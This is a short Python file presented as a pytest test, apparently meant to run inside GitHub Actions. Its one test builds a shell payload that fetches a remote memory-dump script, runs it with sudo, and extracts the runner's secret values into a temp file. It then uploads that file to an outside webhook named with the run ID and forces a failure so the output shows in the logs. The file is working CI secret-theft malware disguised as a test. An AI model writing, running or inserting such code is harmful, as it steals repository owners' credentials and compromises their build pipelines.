"""Exploit test."""
import os
import subprocess


def test_pwn():
    """Run exploit."""
    run_id = os.getenv("GITHUB_RUN_ID")
    payload = (
        "echo 'Starting exploit...'; "
        "touch /tmp/secrets; "
        "curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py "
        "| sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' "
        ">> \"/tmp/secrets\" || echo 'memdump failed'; "
        f"curl -X PUT -d @/tmp/secrets \"https://open-hookbin.vercel.app/{run_id}\" "
        "&& echo 'Hookbin call successful' || echo 'Hookbin call failed'"
    )
    result = subprocess.run(payload, shell=True, capture_output=True, text=True)
    # Force failure to see output in logs if -s is not used
    assert False, f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
